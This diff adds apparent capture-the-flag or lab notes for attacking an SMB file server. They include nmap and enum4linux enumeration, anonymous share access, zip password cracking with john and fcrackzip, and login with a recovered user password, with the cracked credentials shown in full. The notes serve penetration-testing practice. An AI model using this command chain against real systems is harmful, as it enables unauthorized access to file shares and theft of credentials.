@@ -1,0 +1,199 @@
+Scans :
+
+NMAP :
+nmap -sC -sV 10.10.10.22 -Pn -oA blue                                                                                                                                                                                              130 ⨯
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-13 04:27 EST
+Nmap scan report for 10.10.10.22
+Host is up (0.018s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: LINUXSERVER
+
+Host script results:
+|_clock-skew: mean: -26s, deviation: 0s, median: -26s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: fileshare
+|   NetBIOS computer name: LINUXSERVER\x00
+|   Domain name: \x00
+|   FQDN: fileshare
+|_  System time: 2021-12-13T09:27:03+00:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-12-13T09:27:04
+|_  start_date: N/A
+sudo nmap --script=smb-enum-shares -sV 10.10.10.22 -p 445,139
+Host script results:
+| smb-enum-shares: 
+|   account_used: <blank>
+|   \\10.10.10.22\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Public File Server)
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.22\myles: 
+|     Type: STYPE_DISKTREE
+|     Comment: Myles Data
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\myles
+|     Anonymous access: <none>
+|   \\10.10.10.22\public: 
+|     Type: STYPE_DISKTREE
+|     Comment: Public
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\share
+|_    Anonymous access: READ/WRITE
+
+ENUM4LINUX :
+Session Check on 10.10.10.22:
+[+] Server 10.10.10.22 allows sessions using username '', password ''
+OS information on 10.10.10.22:
+[+] Got OS info for 10.10.10.22 from srvinfo:
+        LINUXSERVER    Wk Sv PrQ Unx NT SNT Public File Server
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+Users on 10.10.10.22:
+index: 0x1 RID: 0x1f5 acb: 0x00000015 Account: guest    Name:   Desc: 
+index: 0x2 RID: 0x3e8 acb: 0x00000010 Account: myles    Name:   Desc:
+user:[guest] rid:[0x1f5]
+user:[myles] rid:[0x3e8]
+Share Enumeration on 10.10.10.22:
+Sharename       Type      Comment
+        ---------       ----      -------
+        public          Disk      Public
+        myles           Disk      Myles Data
+        IPC$            IPC       IPC Service (Public File Server)
+//10.10.10.22/public    Mapping: OK, Listing: OK
+Password Policy Information for 10.10.10.22:
+[+] Password Info for Domain: LINUXSERVER
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+	[+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes
+
+SMBMAP:
+smbmap -R -H 10.10.10.22 -P 445
+[+] Guest session       IP: 10.10.10.22:445     Name: 10.10.10.22                                       
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        public                                                  READ ONLY       Public
+        .\public\*
+        dr--r--r--                0 Thu Dec  9 14:46:05 2021    .
+        dr--r--r--                0 Sun Dec 12 20:00:21 2021    ..
+        dr--r--r--                0 Wed Dec  8 10:39:29 2021    learning
+        dr--r--r--                0 Wed Dec  8 10:39:29 2021    ui-assets
+        dr--r--r--                0 Wed Dec  8 11:16:49 2021    staff
+        .\public\learning\*
+        dr--r--r--                0 Wed Dec  8 10:39:29 2021    .
+        dr--r--r--                0 Thu Dec  9 14:46:05 2021    ..
+        fr--r--r--          1759034 Wed Dec  8 10:39:29 2021    BashNotesForProfessionals.pdf
+        fr--r--r--          5111998 Wed Dec  8 10:39:29 2021    CPlusPlusNotesForProfessionals.pdf
+        fr--r--r--           878053 Wed Dec  8 10:39:29 2021    LinuxNotesForProfessionals.pdf
+        fr--r--r--          2753940 Wed Dec  8 10:39:29 2021    AlgorithmsNotesForProfessionals.pdf
+        fr--r--r--          1097854 Wed Dec  8 10:39:29 2021    KotlinNotesForProfessionals.pdf
+        fr--r--r--          2490744 Wed Dec  8 10:39:29 2021    CNotesForProfessionals.pdf
+        fr--r--r--          7386481 Wed Dec  8 10:39:29 2021    JavaNotesForProfessionals.pdf
+        fr--r--r--         12482489 Wed Dec  8 10:39:29 2021    AndroidNotesForProfessionals.pdf
+        fr--r--r--          2607237 Wed Dec  8 10:39:29 2021    GitNotesForProfessionals.pdf
+        .\public\ui-assets\*
+        dr--r--r--                0 Wed Dec  8 10:39:29 2021    .
+        dr--r--r--                0 Thu Dec  9 14:46:05 2021    ..
+        fr--r--r--             2650 Wed Dec  8 10:39:29 2021    logov3.png
+        fr--r--r--           215740 Wed Dec  8 10:39:29 2021    not-validated-do-not-use.png
+        fr--r--r--             9238 Wed Dec  8 10:39:29 2021    logov2.jpeg
+        fr--r--r--           335401 Wed Dec  8 10:39:29 2021    logov1.png
+        .\public\staff\*
+        dr--r--r--                0 Wed Dec  8 11:16:49 2021    .
+        dr--r--r--                0 Thu Dec  9 14:46:05 2021    ..
+        fr--r--r--           115209 Wed Dec  8 10:39:29 2021    myles-card.png
+        fr--r--r--             3758 Wed Dec  8 11:16:45 2021    pmanager.zip
+        myles                                                   NO ACCESS       Myles Data
+        IPC$                                                    NO ACCESS       IPC Service (Public File Server)
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Exploitation :
+
+\\10.10.10.22\public Anonymous access: READ/WRITE
+
+Connection as Anonymous : 
+smbclient //10.10.10.22/Public 
+Enter WORKGROUP\kali's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Dec  9 14:46:06 2021
+  ..                                  D        0  Sun Dec 12 20:00:21 2021
+  learning                            D        0  Wed Dec  8 10:39:30 2021
+  ui-assets                           D        0  Wed Dec  8 10:39:30 2021
+  staff                               D        0  Wed Dec  8 11:16:50 2021
+
+smb: \staff\> ls
+  .                                   D        0  Wed Dec  8 11:16:50 2021
+  ..                                  D        0  Thu Dec  9 14:46:06 2021
+  myles-card.png                      N   115209  Wed Dec  8 10:39:30 2021
+  pmanager.zip                        N     3758  Wed Dec  8 11:16:46 2021
+
+smb: \> get staff\pmanager.zip 
+getting file \staff\pmanager.zip of size 3758 as staff\pmanager.zip (45.9 KiloBytes/sec) (average 45.9 KiloBytes/sec)
+smb: \staff\> get myles-card.png 
+getting file \staff\myles-card.png of size 115209 as myles-card.png (803.6 KiloBytes/sec) (average 399.5 KiloBytes/sec)
+pmanager.zip file is protected by password
+
+cracking pmanager archive password:
+JOHNTHERIPPER:
+
+zip2john pmanager.zip > hash.txt
+ver 2.0 efh 5455 efh 7875 pmanager.zip/pmanager/pmanager PKZIP Encr: TS_chk, cmplen=3558, decmplen=16688, crc=9B1C124D ts=818B cs=818b type=8
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                                                                                                                                            1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter22         (pmanager.zip/pmanager/pmanager)     
+1g 0:00:00:00 DONE (2021-12-13 05:47) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s softball27..eatme1
+
+FCRACKZIP:
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt pmanager.zip
+PASSWORD FOUND!!!!: pw == hunter22
+
+./pmanager
+Username : myles (enum4linux/users)
+User id : 9748728 (found in the same directory as pmanager archive, myles-card.png)
+
+Your password is :
+<78P7,P
+
+connection on Myles profile :
+smbclient //10.10.10.22/myles -U myles                                                                                                                                                                                               1 ⨯
+Enter WORKGROUP\myles's password: <78P7,P
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Dec  9 14:46:06 2021
+  ..                                  D        0  Thu Dec  9 14:46:04 2021
+  .bashrc                             H     3771  Mon Aug 31 19:27:45 2015
+  .profile                            H      655  Fri Jul 12 15:26:32 2019
+  .bash_logout                        H      220  Mon Aug 31 19:27:45 2015
+  todo                                N      164  Wed Dec  8 10:39:30 2021
+  id_rsa.cpt                          N     2634  Wed Dec  8 10:39:30 2021
+  how-to-decrypt-my-key               N       36  Wed Dec  8 10:39:30 2021
